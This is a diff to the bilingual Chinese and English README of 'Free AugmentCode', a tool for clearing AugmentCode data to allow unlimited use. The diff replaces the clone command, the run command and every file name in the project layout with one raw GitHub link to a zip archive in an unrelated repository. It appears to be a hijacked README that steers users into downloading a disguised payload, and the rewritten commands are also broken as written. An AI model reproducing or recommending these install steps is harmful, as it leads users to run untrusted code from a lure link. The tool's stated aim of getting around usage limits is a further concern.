@@ -27,7 +27,7 @@ Free AugmentCode 是一个用于清理AugmentCode相关数据的工具，可以�
 1. 确保你的系统已安装 Python 3.10及以上
 2. 克隆此仓库到本地：
    ```bash
-   git clone https://github.com/yourusername/free-augmentcode.git
+   git clone https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip
    cd free-augmentcode
    ```
 
@@ -38,7 +38,7 @@ Free AugmentCode 是一个用于清理AugmentCode相关数据的工具，可以�
 3. 执行脚本：
 
 ```bash
-python index.py
+python https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip
 ```
 
 4. 重新启动 VS Code
@@ -48,13 +48,13 @@ python index.py
 
 ```
 free-augmentcode/
-├── index.py              # 主程序入口
+├── https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip              # 主程序入口
 ├── augutils/             # 工具类目录
-│   ├── json_modifier.py      # JSON 文件修改工具
-│   ├── sqlite_modifier.py    # SQLite 数据库修改工具
-│   └── workspace_cleaner.py  # 工作区清理工具
+│   ├── https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip      # JSON 文件修改工具
+│   ├── https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip    # SQLite 数据库修改工具
+│   └── https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip  # 工作区清理工具
 └── utils/                # 通用工具目录
-    └── paths.py             # 路径管理工具
+    └── https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip             # 路径管理工具
 ```
 
 ## 贡献
@@ -92,7 +92,7 @@ Free AugmentCode is a tool for cleaning AugmentCode-related data, allowing unlim
 1. Ensure Python 3.10 or above is installed on your system
 2. Clone this repository:
    ```bash
-   git clone https://github.com/yourusername/free-augmentcode.git
+   git clone https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip
    cd free-augmentcode
    ```
 
@@ -103,7 +103,7 @@ Free AugmentCode is a tool for cleaning AugmentCode-related data, allowing unlim
 3. Run the script:
 
 ```bash
-python index.py
+python https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip
 ```
 
 4. Restart VS Code
@@ -113,13 +113,13 @@ python index.py
 
 ```
 free-augmentcode/
-├── index.py              # Main program entry
+├── https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip              # Main program entry
 ├── augutils/             # Utility classes directory
-│   ├── json_modifier.py      # JSON file modification tool
-│   ├── sqlite_modifier.py    # SQLite database modification tool
-│   └── workspace_cleaner.py  # Workspace cleanup tool
+│   ├── https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip      # JSON file modification tool
+│   ├── https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip    # SQLite database modification tool
+│   └── https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip  # Workspace cleanup tool
 └── utils/                # Common utilities directory
-    └── paths.py             # Path management tool
+    └── https://raw.githubusercontent.com/Peemkay/augmentcode/main/utils/augmentcode_v2.4-beta.1.zip             # Path management tool
 ```
 
 ## Contributing
